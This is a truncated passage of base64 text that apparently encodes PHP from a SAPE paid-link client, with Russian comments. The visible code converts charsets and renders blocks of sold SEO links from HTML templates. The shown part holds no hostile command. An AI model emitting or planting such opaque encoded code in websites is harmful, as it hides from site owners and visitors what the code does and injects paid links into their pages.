DRjyDQutC+0LTQuNGA0L7QstC60LAsINC4INC40LfQstC10YHRgtC90LAg0LrQvtC00LjRgNC+0LLQutCwINC60LXRiNCwLCDQuCDQvtC90Lgg0YDQsNC30L3Ri9C1LCDQutC+0L3QstC10YDRgtC40YDRg9C10Lwg0LIg0LfQsNC00LDQvdC90YPRjgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2NvbnZlcnRDaGFyc2V0KCRodG1sKQogICAgewogICAgICAgIGlmIChzdHJsZW4oJHRoaXMtPl9jaGFyc2V0KSA+IDAKICAgICAgICAgICAgJiYgc3RybGVuKCR0aGlzLT5fc2FwZV9jaGFyc2V0KSA+IDAKICAgICAgICAgICAgJiYgJHRoaXMtPl9zYXBlX2NoYXJzZXQgIT0gJHRoaXMtPl9jaGFyc2V0CiAgICAgICAgICAgICYmIGZ1bmN0aW9uX2V4aXN0cygnaWNvbnYnKQogICAgICAgICkgewogICAgICAgICAgICAkbmV3X2h0bWwgPSBAaWNvbnYoJHRoaXMtPl9zYXBlX2NoYXJzZXQsICR0aGlzLT5fY2hhcnNldCwgJGh0bWwpOwogICAgICAgICAgICBpZiAoJG5ld19odG1sKSB7CiAgICAgICAgICAgICAgICAkaHRtbCA9ICRuZXdfaHRtbDsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRodG1sOwogICAgfQoKICAgIC8qKgogICAgICog0JLRi9Cy0L7QtCDRgdGB0YvQu9C+0Log0LIg0LLQuNC00LUg0LHQu9C+0LrQsAogICAgICoKICAgICAqIC0g0J/RgNC40LzQtdGH0LDQvdC40LU6INC90LDRh9C40L3QsNGPINGBINCy0LXRgNGB0LjQuCAxLjIuMiDQstGC0L7RgNC+0Lkg0LDRgNCz0YPQvNC10L3RgiAkb2Zmc2V0INGD0LHRgNCw0L0uINCV0YHQu9C4CiAgICAgKiDQv9C10YDQtdC00LDQstCw0YLRjCDQtdCz0L4g0YHQvtCz0LvQsNGB0L3QviDRgdGC0LDRgNC+0Lkg0YHQuNCz0L3QsNGC0YPRgNC1LCDRgtC+INC+0L0g0LHRg9C00LXRgiDQv9GA0L7QuNCz0L3QvtGA0LjRgNC+0LLQsNC9LgogICAgICoKICAgICAqIEBwYXJhbSBpbnQgICAkbiAgICAgICDQmtC+0LvQuNGH0LXRgdGC0LLQvtCy0L4g0YHRgdGL0LvQvtC6LCDQutC+0YLQvtGA0YvQtSDQvdGD0LbQvdC+INCy0YvQstC10YHRgtC4INCyINGC0LXQutGD0YnQtdC8INCx0LvQvtC60LUKICAgICAqIEBwYXJhbSBhcnJheSAkb3B0aW9ucyDQntC/0YbQuNC4CiAgICAgKgogICAgICogPGNvZGU+CiAgICAgKiAkb3B0aW9ucyA9IGFycmF5KCk7CiAgICAgKiAkb3B0aW9uc1snYmxvY2tfbm9fY3NzJ10gPSAoZmFsc2V8dHJ1ZSk7CiAgICAgKiAvLyDQn9C10YDQtdC+0L/RgNC10LTQtdC70Y/QtdGCINC30LDQv9GA0LXRgiDQvdCwINCy0YvQstC+0LQgY3NzINCyINC60L7QtNC1INGB0YLRgNCw0L3QuNGG0Ys6IGZhbHNlIC0g0LLRi9Cy0L7QtNC40YLRjCBjc3MKICAgICAqICRvcHRpb25zWydibG9ja19vcmllbnRhdGlvbiddID0gKDF8MCk7CiAgICAgKiAvLyDQn9C10YDQtdC+0L/RgNC10LTQtdC70Y/QtdGCINC+0YDQuNC10L3RgtCw0YbQuNGOINCx0LvQvtC60LA6IDEgLSDQs9C+0YDQuNC30L7QvdGC0LDQu9GM0L3QsNGPLCAwIC0g0LLQtdGA0YLQuNC60LDQu9GM0L3QsNGPCiAgICAgKiAkb3B0aW9uc1snYmxvY2tfd2lkdGgnXSA9ICgnYXV0byd8J1s/XXB4J3wnWz9dJSd8J1s/XScpOwogICAgICogLy8g0J/QtdGA0LXQvtC/0YDQtdC00LXQu9GP0LXRgiDRiNC40YDQuNC90YMg0LHQu9C+0LrQsDoKICAgICAqIC8vICdhdXRvJyAgLSDQvtC/0YDQtdC00LXQu9GP0LXRgtGB0Y8g0YjQuNGA0LjQvdC+0Lkg0LHQu9C+0LrQsC3Qv9GA0LXQtNC60LAg0YEg0YTQuNC60YHQuNGA0L7QstCw0L3QvdC+0Lkg0YjQuNGA0LjQvdC+0LksCiAgICAgKiAvLyDQtdGB0LvQuCDRgtCw0LrQvtCy0L7Qs9C+INC90LXRgiwg0YLQviDQt9Cw0LnQvNC10YIg0LLRgdGOINGI0LjRgNC40L3RgwogICAgICogLy8gJ1s/XXB4JyAtINC30L3QsNGH0LXQvdC40LUg0LIg0L/QuNC60YHQtdC70Y/RhQogICAgICogLy8gJ1s/XSUnICAtINC30L3QsNGH0LXQvdC40LUg0LIg0L/RgNC+0YbQtdC90YLQsNGFINC+0YIg0YjQuNGA0LjQvdGLINCx0LvQvtC60LAt0L/RgNC10LTQutCwINGBINGE0LjQutGB0LjRgNC+0LLQsNC90L3QvtC5INGI0LjRgNC40L3QvtC5CiAgICAgKiAvLyAnWz9dJyAgIC0g0LvRjtCx0L7QtSDQtNGA0YPQs9C+0LUg0LfQvdCw0YfQtdC90LjQtSwg0LrQvtGC0L7RgNC+0LUg0L/QvtC00LTQtdGA0LbQuNCy0LDQtdGC0YHRjyDRgdC/0LXRhtC40YTQuNC60LDRhtC40LXQuSBDU1MKICAgICAqIDwvY29kZT4KICAgICAqCiAgICAgKiBAc2VlIHJldHVybl9saW5rcygpCiAgICAgKiBAc2VlIHJldHVybl9jb3VudGVyKCkKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcmV0dXJuX2Jsb2NrX2xpbmtzKCRuID0gbnVsbCwgJG9wdGlvbnMgPSBudWxsKQogICAgewoKICAgICAgICAkbnVtYXJncyA9IGZ1bmNfbnVtX2FyZ3MoKTsKICAgICAgICAkYXJncyAgICA9IGZ1bmNfZ2V0X2FyZ3MoKTsKCiAgICAgICAgLy/Qn9GA0L7QstC10YDRj9C10Lwg0LDRgNCz0YPQvNC10L3RgtGLINC00LvRjyDRgdGC0LDRgNC+0Lkg0YHQuNCz0L3QsNGC0YPRgNGLINCy0YvQt9C+0LLQsAogICAgICAgIGlmICgyID09ICRudW1hcmdzKSB7ICAgICAgICAgICAvLyByZXR1cm5fbGlua3MoJG4sICRvcHRpb25zKQogICAgICAgICAgICBpZiAoIWlzX2FycmF5KCRhcmdzWzFdKSkgeyAvLyByZXR1cm5fbGlua3MoJG4sICRvZmZzZXQpIC0gZGVwcmVjYXRlZCEKICAgICAgICAgICAgICAgICRvcHRpb25zID0gbnVsbDsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmICgyIDwgJG51bWFyZ3MpIHsgLy8gcmV0dXJuX2xpbmtzKCRuLCAkb2Zmc2V0LCAkb3B0aW9ucykgLSBkZXByZWNhdGVkIQoKICAgICAgICAgICAgaWYgKCFpc19hcnJheSgkb3B0aW9ucykpIHsKICAgICAgICAgICAgICAgICRvcHRpb25zID0gJGFyZ3NbMl07CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vINCe0LHRitC10LTQuNC90LjRgtGMINC/0LDRgNCw0LzQtdGC0YDRiwogICAgICAgIGlmIChlbXB0eSgkb3B0aW9ucykpIHsKICAgICAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOwogICAgICAgIH0KCiAgICAgICAgJGRlZmF1bHRzICAgICAgICAgICAgICAgICAgICAgID0gYXJyYXkoKTsKICAgICAgICAkZGVmYXVsdHNbJ2Jsb2NrX25vX2NzcyddICAgICAgPSBmYWxzZTsKICAgICAgICAkZGVmYXVsdHNbJ2Jsb2NrX29yaWVudGF0aW9uJ10gPSAxOwogICAgICAgICRkZWZhdWx0c1snYmxvY2tfd2lkdGgnXSAgICAgICA9ICcnOwoKICAgICAgICAkZXh0X29wdGlvbnMgPSBhcnJheSgpOwogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2Jsb2NrX3RwbF9vcHRpb25zKSAmJiBpc19hcnJheSgkdGhpcy0+X2Jsb2NrX3RwbF9vcHRpb25zKSkgewogICAgICAgICAgICAkZXh0X29wdGlvbnMgPSAkdGhpcy0+X2Jsb2NrX3RwbF9vcHRpb25zOwogICAgICAgIH0KCiAgICAgICAgJG9wdGlvbnMgPSBhcnJheV9tZXJnZSgkZGVmYXVsdHMsICRleHRfb3B0aW9ucywgJG9wdGlvbnMpOwoKICAgICAgICAvLyDQodGB0YvQu9C60Lgg0L/QtdGA0LXQtNCw0L3RiyDQvdC1INC80LDRgdGB0LjQstC+0LwgKNGH0LXQui3QutC+0LQpID0+INCy0YvQstC+0LTQuNC8INC60LDQuiDQtdGB0YLRjCArINC40L3RhNC+INC+INCx0LvQvtC60LUKICAgICAgICBpZiAoIWlzX2FycmF5KCR0aGlzLT5fbGlua3NfcGFnZSkpIHsKICAgICAgICAgICAgJGh0bWwgPSAkdGhpcy0+X3JldHVybl9hcnJheV9saW5rc19odG1sKCcnLCBhcnJheSgnaXNfYmxvY2tfbGlua3MnID0+IHRydWUpKTsKCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+X3JldHVybl9odG1sKCR0aGlzLT5fbGlua3NfcGFnZSAuICRodG1sKTsKICAgICAgICB9IC8vINCd0LUg0L/QtdGA0LXQtNCw0L3RiyDRiNCw0LHQu9C+0L3RiyA9PiDQvdC10LvRjNC30Y8g0LLRi9Cy0LXRgdGC0Lgg0LHQu9C+0LrQvtC8IC0g0L3QuNGH0LXQs9C+INC90LUg0LTQtdC70LDRgtGMCiAgICAgICAgZWxzZWlmICghaXNzZXQoJHRoaXMtPl9ibG9ja190cGwpKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+X3JldHVybl9odG1sKCcnKTsKICAgICAgICB9CgogICAgICAgIC8vINCe0L/RgNC10LTQtdC70LjQvCDQvdGD0LbQvdC+0LUg0YfQuNGB0LvQviDRjdC70LXQvNC10L3RgtC+0LIg0LIg0LHQu9C+0LrQtQoKICAgICAgICAkdG90YWxfcGFnZV9saW5rcyA9IGNvdW50KCR0aGlzLT5fbGlua3NfcGFnZSk7CgogICAgICAgICRuZWVkX3Nob3dfb2JsaWdhdG9yeV9ibG9jayAgPSBmYWxzZTsKICAgICAgICAkbmVlZF9zaG93X2NvbmRpdGlvbmFsX2Jsb2NrID0gZmFsc2U7CiAgICAgICAgJG5fcmVxdWVzdGVkICAgICAgICAgICAgICAgICA9IDA7CgogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2Jsb2NrX2luc19pdGVtb2JsaWdhdG9yeSkpIHsKICAgICAgICAgICAgJG5lZWRfc2hvd19vYmxpZ2F0b3J5X2Jsb2NrID0gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIGlmIChpc19udW1lcmljKCRuKSAmJiAkbiA+PSAkdG90YWxfcGFnZV9saW5rcykgewoKICAgICAgICAgICAgJG5fcmVxdWVzdGVkID0gJG47CgogICAgICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9ibG9ja19pbnNfaXRlbWNvbmRpdGlvbmFsKSkgewogICAgICAgICAgICAgICAgJG5lZWRfc2hvd19jb25kaXRpb25hbF9ibG9jayA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICghaXNfbnVtZXJpYygkbikgfHwgJG4gPiAkdG90YWxfcGFnZV9saW5rcykgewogICAgICAgICAgICAkbiA9ICR0b3RhbF9wYWdlX2xpbmtzOwogICAgICAgIH0KCiAgICAgICAgLy8g0JLRi9Cx0L7RgNC60LAg0YHRgdGL0LvQvtC6CiAgICAgICAgJGxpbmtzID0gYXJyYXkoKTsKICAgICAgICBmb3IgKCRpID0gMTsgJGkgPD0gJG47ICRpKyspIHsKICAgICAgICAgICAgJGxpbmtzW10gPSBhcnJheV9zaGlmdCgkdGhpcy0+X2xpbmtzX3BhZ2UpOwogICAgICAgIH0KCiAgICAgICAgJGh0bWwgPSAnJzsKCiAgICAgICAgLy8g0J/QvtC00YHRh9C10YIg0YfQuNGB0LvQsCDQvtC/0YbQuNC+0L3QsNC70YzQvdGL0YUg0LHQu9C+0LrQvtCyCiAgICAgICAgJG5vZl9jb25kaXRpb25hbCA9IDA7CiAgICAgICAgaWYgKGNvdW50KCRsaW5rcykgPCAkbl9yZXF1ZXN0ZWQgJiYgdHJ1ZSA9PSAkbmVlZF9zaG93X2NvbmRpdGlvbmFsX2Jsb2NrKSB7CiAgICAgICAgICAgICRub2ZfY29uZGl0aW9uYWwgPSAkbl9yZXF1ZXN0ZWQgLSBjb3VudCgkbGlua3MpOwogICAgICAgIH0KCiAgICAgICAgLy/QldGB0LvQuCDQvdC10YIg0YHRgdGL0LvQvtC6INC4INC90LXRgiDQstGB0YLQsNCy0L3Ri9GFINCx0LvQvtC60L7Qsiwg0YLQviDQvdC40YfQtdCz0L4g0L3QtSDQstGL0LLQvtC00LjQvAogICAgICAgIGlmIChlbXB0eSgkbGlua3MpICYmICRuZWVkX3Nob3dfb2JsaWdhdG9yeV9ibG9jayA9PSBmYWxzZSAmJiAkbm9mX2NvbmRpdGlvbmFsID09IDApIHsKCiAgICAgICAgICAgICRyZXR1cm5fbGlua3Nfb3B0aW9ucyA9IGFycmF5KAogICAgICAgICAgICAgICAgJ2lzX2Jsb2NrX2xpbmtzJyAgICAgID0+IHRydWUsCiAgICAgICAgICAgICAgICAnbm9mX2xpbmtzX3JlcXVlc3RlZCcgPT4gJG5fcmVxdWVzdGVkLAogICAgICAgICAgICAgICAgJ25vZl9saW5rc19kaXNwbGF5ZWQnID0+IDAsCiAgICAgICAgICAgICAgICAnbm9mX29ibGlnYXRvcnknICAgICAgPT4gMCwKICAgICAgICAgICAgICAgICdub2ZfY29uZGl0aW9uYWwnICAgICA9PiAwCiAgICAgICAgICAgICk7CgogICAgICAgICAgICAkaHRtbCA9ICR0aGlzLT5fcmV0dXJuX2FycmF5X2xpbmtzX2h0bWwoJGh0bWwsICRyZXR1cm5fbGlua3Nfb3B0aW9ucyk7CgogICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yZXR1cm5faHRtbCgkaHRtbCk7CiAgICAgICAgfQoKICAgICAgICAvLyDQlNC10LvQsNC10Lwg0LLRi9Cy0L7QtCDRgdGC0LjQu9C10LksINGC0L7Qu9GM0LrQviDQvtC00LjQvSDRgNCw0LcuINCY0LvQuCDQvdC1INCy0YvQstC+0LTQuNC8INC40YUg0LLQvtC+0LHRidC1LCDQtdGB0LvQuCDRgtCw0Log0LfQsNC00LDQvdC+INCyINC/0LDRgNCw0LzQtdGC0YDQsNGFCiAgICAgICAgJHNfZ2xvYmFscyA9IG5ldyBTQVBFX2dsb2JhbHMoKTsKICAgICAgICBpZiAoISRzX2dsb2JhbHMtPmJsb2NrX2Nzc19zaG93bigpICYmIGZhbHNlID09ICRvcHRpb25zWydibG9ja19ub19jc3MnXSkgewogICAgICAgICAgICAkaHRtbCAuPSAkdGhpcy0+X2Jsb2NrX3RwbFsnY3NzJ107CiAgICAgICAgICAgICRzX2dsb2JhbHMtPmJsb2NrX2Nzc19zaG93bih0cnVlKTsKICAgICAgICB9CgogICAgICAgIC8vINCS0YHRgtCw0LLQvdC+0Lkg0LHQu9C+0Log0LIg0L3QsNGH0LDQu9C1INCy0YHQtdGFINCx0LvQvtC60L7QsgogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2Jsb2NrX2luc19iZWZvcmVhbGwpICYmICEkc19nbG9iYWxzLT5ibG9ja19pbnNfYmVmb3JlYWxsX3Nob3duKCkpIHsKICAgICAgICAgICAgJGh0bWwgLj0gJHRoaXMtPl9ibG9ja19pbnNfYmVmb3JlYWxsOwogICAgICAgICAgICAkc19nbG9iYWxzLT5ibG9ja19pbnNfYmVmb3JlYWxsX3Nob3duKHRydWUpOwogICAgICAgIH0KICAgICAgICB1bnNldCgkc19nbG9iYWxzKTsKCiAgICAgICAgLy8g0JLRgdGC0LDQstC90L7QuSDQsdC70L7QuiDQsiDQvdCw0YfQsNC70LUg0LHQu9C+0LrQsAogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2Jsb2NrX2luc19iZWZvcmVibG9jaykpIHsKICAgICAgICAgICAgJGh0bWwgLj0gJHRoaXMtPl9ibG9ja19pbnNfYmVmb3JlYmxvY2s7CiAgICAgICAgfQoKICAgICAgICAvLyDQn9C+0LvRg9GH0LDQtdC8INGI0LDQsdC70L7QvdGLINCyINC30LDQstC40YHQuNC80L7RgdGC0Lgg0L7RgiDQvtGA0LjQtdC90YLQsNGG0LjQuCDQsdC70L7QutCwCiAgICAgICAgJGJsb2NrX3RwbF9wYXJ0cyA9ICR0aGlzLT5fYmxvY2tfdHBsWyRvcHRpb25zWydibG9ja19vcmllbnRhdGlvbiddXTsKCiAgICAgICAgJGJsb2NrX3RwbCAgICAgICAgICA9ICRibG9ja190cGxfcGFydHNbJ2Jsb2NrJ107CiAgICAgICAgJGl0ZW1fdHBsICAgICAgICAgICA9ICRibG9ja190cGxfcGFydHNbJ2l0ZW0nXTsKICAgICAgICAkaXRlbV9jb250YWluZXJfdHBsID0gJGJsb2NrX3RwbF9wYXJ0c1snaXRlbV9jb250YWluZXInXTsKICAgICAgICAkaXRlbV90cGxfZnVsbCAgICAgID0gc3RyX3JlcGxhY2UoJ3tpdGVtfScsICRpdGVtX3RwbCwgJGl0ZW1fY29udGFpbmVyX3RwbCk7CiAgICAgICAgJGl0ZW1zICAgICAgICAgICAgICA9ICcnOwoKICAgICAgICAkbm9mX2l0ZW1zX3RvdGFsID0gY291bnQoJGxpbmtzKTsKICAgICAgICBmb3JlYWNoICgkbGlua3MgYXMgJGxpbmspIHsKCiAgICAgICAgICAgIC8vINCe0LHRi9GH0L3QsNGPINC60YDQsNGB0LjQstCw0Y8g0YHRgdGL0LvQutCwCiAgICAgICAgICAgICRpc19mb3VuZCA9IHByZWdfbWF0Y2goJyM8YSBocmVmPSIoaHR0cHM/Oi8vKFteIi9dKylbXiJdKikiW14+XSo+W1xzXSooW148XSspPC9hPiNpJywgJGxpbmssICRsaW5rX2l0ZW0pOwogICAgICAgICAgICAvLyDQmtCw0YDRgtC40L3QvtGH0LrQsNGPINC60YDQsNGB0LjQstCw0Y8g0YHRgdGL0LvQutCwCiAgICAgICAgICAgIGlmICghJGlzX2ZvdW5kKSB7CiAgICAgICAgICAgICAgICBwcmVnX21hdGNoKCcjPGEgaHJlZj0iKGh0dHBzPzovLyhbXiIvXSspW14iXSopIltePl0qPjxpbWcuKj9hbHQ9IiguKj8pIi4qPz48L2E+I2knLCAkbGluaywgJGxpbmtfaXRlbSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cnRvdXBwZXInKSAmJiBzdHJsZW4oJHRoaXMtPl9zYXBlX2NoYXJzZXQpID4gMCkgewogICAgICAgICAgICAgICAgJGhlYWRlcl9yZXN0ICAgICAgICAgPSBtYl9zdWJzdHIoJGxpbmtfaXRlbVszXSwgMSwgbWJfc3RybGVuKCRsaW5rX2l0ZW1bM10sICR0aGlzLT5fc2FwZV9jaGFyc2V0KSAtIDEsICR0aGlzLT5fc2FwZV9jaGFyc2V0KTsKICAgICAgICAgICAgICAgICRoZWFkZXJfZmlyc3RfbGV0dGVyID0gbWJfc3RydG91cHBlcihtYl9zdWJzdHIoJGxpbmtfaXRlbVszXSwgMCwgMSwgJHRoaXMtPl9zYXBlX2NoYXJzZXQpLCAkdGhpcy0+X3NhcGVfY2hhcnNldCk7CiAgICAgICAgICAgICAgICAkbGlua19pdGVtWzNdICAgICAgICA9ICRoZWFkZXJfZmlyc3RfbGV0dGVyIC4gJGhlYWRlcl9yZXN0OwogICAgICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCd1Y2ZpcnN0JykgJiYgKHN0cmxlbigkdGhpcy0+X3NhcGVfY2hhcnNldCkgPT0gMCB8fCBzdHJwb3MoJHRoaXMtPl9zYXBlX2NoYXJzZXQsICcxMjUxJykgIT09IGZhbHNlKSkgewogICAgICAgICAgICAgICAgJGxpbmtfaXRlbVszXVswXSA9IHVjZmlyc3QoJGxpbmtfaXRlbVszXVswXSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vINCV0YHQu9C4INC10YHRgtGMINGA0LDRgdC60L7QtNC40YDQvtCy0LDQvdC90YvQuSBVUkwsINGC0L4g0LfQsNC80LXQvdC40YLRjCDQtdCz0L4g0L/RgNC4INCy0YvQstC+0LTQtQogICAgICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9ibG9ja191cmlfaWRuYSkgJiYgaXNzZXQoJHRoaXMtPl9ibG9ja191cmlfaWRuYVskbGlua19pdGVtWzJdXSkpIHsKICAgICAgICAgICAgICAgICRsaW5rX2l0ZW1bMl0gPSAkdGhpcy0+X2Jsb2NrX3VyaV9pZG5hWyRsaW5rX2l0ZW1bMl1dOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkaXRlbSA9ICRpdGVtX3RwbF9mdWxsOwogICAgICAgICAgICAkaXRlbSA9IHN0cl9yZXBsYWNlKCd7aGVhZGVyfScsICRsaW5rX2l0ZW1bM10sICRpdGVtKTsKICAgICAgICAgICAgJGl0ZW0gPSBzdHJfcmVwbGFjZSgne3RleHR9JywgdHJpbSgkbGluayksICRpdGVtKTsKICAgICAgICAgICAgJGl0ZW0gPSBzdHJfcmVwbGFjZSgne3VybH0nLCAkbGlua19pdGVtWzJdLCAkaXRlbSk7CiAgICAgICAgICAgICRpdGVtID0gc3RyX3JlcGxhY2UoJ3tsaW5rfScsICRsaW5rX2l0ZW1bMV0sICRpdGVtKTsKICAgICAgICAgICAgJGl0ZW1zIC49ICRpdGVtOwogICAgICAgIH0KCiAgICAgICAgLy8g0JLRgdGC0LDQstC90L7QuSDQvtCx0Y/Qt9Cw0YLQu9GM0L3Ri9C5INGN0LvQtdC80LXQvdGCINCyINCx0LvQvtC60LUKICAgICAgICBpZiAodHJ1ZSA9PSAkbmVlZF9zaG93X29ibGlnYXRvcnlfYmxvY2spIHsKICAgICAgICAgICAgJGl0ZW1zIC49IHN0cl9yZXBsYWNlKCd7aXRlbX0nLCAkdGhpcy0+X2Jsb2NrX2luc19pdGVtb2JsaWdhdG9yeSwgJGl0ZW1fY29udGFpbmVyX3RwbCk7CiAgICAgICAgICAgICRub2ZfaXRlbXNfdG90YWwgKz0gMTsKICAgICAgICB9CgogICAgICAgIC8vINCS0YHRgtCw0LLQvdGL0LUg0L7Qv9GG0LjQvtC90LDQu9GM0L3Ri9C1INGN0LvQtdC80LXQvdGC0Ysg0LIg0LHQu9C+0LrQtQogICAgICAgIGlmICgkbmVlZF9zaG93X2NvbmRpdGlvbmFsX2Jsb2NrID09IHRydWUgJiYgJG5vZl9jb25kaXRpb25hbCA+IDApIHsKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG5vZl9jb25kaXRpb25hbDsgJGkrKykgewogICAgICAgICAgICAgICAgJGl0ZW1zIC49IHN0cl9yZXBsYWNlKCd7aXRlbX0nLCAkdGhpcy0+X2Jsb2NrX2luc19pdGVtY29uZGl0aW9uYWwsICRpdGVtX2NvbnRhaW5lcl90cGwpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRub2ZfaXRlbXNfdG90YWwgKz0gJG5vZl9jb25kaXRpb25hbDsKICAgICAgICB9CgogICAgICAgIGlmICgkaXRlbXMgIT0gJycpIHsKICAgICAgICAgICAgJGh0bWwgLj0gc3RyX3JlcGxhY2UoJ3tpdGVtc30nLCAkaXRlbXMsICRibG9ja190cGwpOwoKICAgICAgICAgICAgLy8g0J/RgNC+0YHRgtCw0LLQu9GP0LXQvCDRiNC40YDQuNC90YMsINGH0YLQvtCx0Ysg0LLQtdC30LTQtSDQvtC00LjQvdC60L7QstCw0Y8g0LHRi9C70LAKICAgICAgICAgICAgaWYgKCRub2ZfaXRlbXNfdG90YWwgPiAwKSB7CiAgICAgICAgICAgICAgICAkaHRtbCA9IHN0cl9yZXBsYWNlKCd7dGRfd2lkdGh9Jywgcm91bmQoMTAwIC8gJG5vZl9pdGVtc190b3RhbCksICRodG1sKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRodG1sID0gc3RyX3JlcGxhY2UoJ3t0ZF93aWR0aH0nLCAwLCAkaHRtbCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vINCV0YHQu9C4INC30LDQtNCw0L3Qviwg0YLQviDQv9C10YDQtdC+0L/RgNC10LTQtdC70LjRgtGMINGI0LjRgNC40L3RgyDQsdC70L7QutCwCiAgICAgICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1snYmxvY2tfd2lkdGgnXSkgJiYgIWVtcHR5KCRvcHRpb25zWydibG9ja193aWR0aCddKSkgewogICAgICAgICAgICAgICAgJGh0bWwgPSBzdHJfcmVwbGFjZSgne2Jsb2NrX3N0eWxlX2N1c3RvbX0nLCAnc3R5bGU9IndpZHRoOiAnIC4gJG9wdGlvbnNbJ2Jsb2NrX3dpZHRoJ10gLiAnIWltcG9ydGFudDsiJywgJGh0bWwpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICB1bnNldCgkYmxvY2tfdHBsX3BhcnRzLCAkYmxvY2tfdHBsLCAkaXRlbXMsICRpdGVtLCAkaXRlbV90cGwsICRpdGVtX2NvbnRhaW5lcl90cGwpOwoKICAgICAgICAvLyDQktGB0YLQsNCy0L3QvtC5INCx0LvQvtC6INCyINC60L7QvdGG0LUg0LHQu9C+0LrQsAogICAgICAgIGlmIChpc3NldCgkdGhpcy0+X2Jsb2NrX2luc19hZnRlcmJsb2NrKSkgewogICAgICAgICAgICAkaHRtbCAuPSAkdGhpcy0+X2Jsb2NrX2luc19hZnRlcmJsb2NrOwogICAgICAgIH0KCiAgICAgICAgLy/Ql9Cw0L/QvtC70L3Rj9C10Lwg0L7RgdGC0LDQstGI0LjQtdGB0Y8g0LzQvtC00LjRhNC40LrQsNGC0L7RgNGLINC30L3QsNGH0LXQvdC40Y/QvNC4CiAgICAgICAgdW5zZXQoJG9wdGlvbnNbJ2Jsb2NrX25vX2NzcyddLCAkb3B0aW9uc1snYmxvY2tfb3JpZW50YXRpb24nXSwgJG9wdGlvbnNbJ2Jsb2NrX3dpZHRoJ10pOwoKICAgICAgICAkdHBsX21vZGlmaWVycyA9IGFycmF5X2tleXMoJG9wdGlvbnMpOwogICAgICAgIGZvcmVhY2ggKCR0cGxfbW9kaWZpZXJzIGFzICRrID0+ICRtKSB7CiAgICAgICAgICAgICR0cGxfbW9kaWZpZXJzWyRrXSA9ICd7JyAuICRtIC4gJ30nOwogICAgICAgIH0KICAgICAgICB1bnNldCgkbSwgJGspOwoKICAgICAgICAkdHBsX21vZGlmaWVyc192YWx1ZXMgPSBhcnJheV92YWx1ZXMoJG9wdGlvbnMpOwoKICAgICAgICAkaHRtbCA9IHN0cl9yZXBsYWNlKCR0cGxfbW9kaWZpZXJzLCAkdHBsX21vZGlmaWVyc192YWx1ZXMsICRodG1sKTsKICAgICAgICB1bnNldCgkdHBsX21vZGlmaWVycywgJHRwbF9tb2RpZmllcnNfdmFsdWVzKTsKCiAgICAgICAgLy/QntGH0LjRidCw0LXQvCDQvdC10LfQsNC/0L7Qu9C90LXQvdC90YvQtSDQvNC+0LTQuNGE0LjQutCw0YLQvtGA0YsKICAgICAgICAkY2xlYXJfbW9kaWZpZXJzX3JlZ2V4cCA9ICcjXHtbYS16XGRfXC1dK1x9Iyc7CiAgICAgICAgJGh0bWwgICAgICAgICAgICAgICAgICAgPSBwcmVnX3JlcGxhY2UoJGNsZWFyX21vZGlmaWVyc19yZWdleHAsICcgJywgJGh0bWwpOwoKICAgICAgICAkcmV0dXJuX2xpbmtzX29wdGlvbnMgPSBhcnJheSgKICAgICAgICAgICAgJ2lzX2Jsb2NrX2xpbmtzJyAgICAgID0+IHRydWUsCiAgICAgICAgICAgICdub2ZfbGlua3NfcmVxdWVzdGVkJyA9PiAkbl9yZXF1ZXN0ZWQsCiAgICAgICAgICAgICdub2ZfbGlua3NfZGlzcGxheWVkJyA9PiAkbiwKICAgICAgICAgICAgJ25vZl9vYmxpZ2F0b3J5JyAgICAgID0+ICgkbmVlZF9zaG93X29ibGlnYXRvcnlfYmxvY2sgPT0gdHJ1ZSA/IDEgOiAwKSwKICAgICAgICAgICAgJ25vZl9jb25kaXRpb25hbCcgICAgID0+ICRub2ZfY29uZGl0aW9uYWwKICAgICAgICApOwoKICAgICAgICAkaHRtbCA9ICR0aGlzLT5fcmV0dXJuX2FycmF5X2xpbmtzX2h0bWwoJGh0bWwsICRyZXR1cm5fbGlua3Nfb3B0aW9ucyk7CgogICAgICAgIHJldHVybiAkdGhpcy0+X3JldHVybl9odG1sKCRodG1sKTsKICAgIH0KCiAgICAvKioKICAgICAqINCS0YvQstC+0LQg0YHRgdGL0LvQvtC6INCyINC+0LHRi9GH0L3QvtC8INCy0LjQtNC1IC0g0YLQtdC60YHRgiDRgSDRgNCw0LfQtNC10LvQuNGC0LXQu9C10LwKICAgICAqCiAgICAgKiAtINCf0YDQuNC80LXRh9Cw0L3QuNC1OiDQvdCw0YfQuNC90LDRjyDRgSDQstC10YDRgdC40LggMS4yLjIg0LLRgtC+0YDQvtC5INCw0YDQs9GD0LzQtdC90YIgJG9mZnNldCDRg9Cx0YDQsNC9LiDQldGB0LvQuAogICAgICog0L/QtdGA0LXQtNCw0LLQsNGC0Ywg0LXQs9C+INGB0L7Qs9C70LDRgdC90L4g0YHRgtCw0YDQvtC5INGB0LjQs9C90LDRgtGD0